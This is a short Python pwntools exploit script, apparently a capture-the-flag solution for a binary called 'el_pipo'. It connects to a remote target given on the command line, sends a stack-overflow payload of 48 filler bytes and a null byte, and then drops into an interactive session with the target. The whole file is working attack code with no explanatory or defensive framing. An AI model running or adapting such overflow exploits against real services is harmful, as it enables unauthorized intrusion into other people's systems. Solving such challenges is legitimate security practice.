from pwn import *

elf = context.binary = ELF('./el_pipo')

# p = process(elf.path)
p = remote(*(sys.argv[1].split(':')))

payload = b'A' * 48
payload += b'\x00'

input('[*] enter to exploit ... ')

p.sendline(payload)
p.interactive()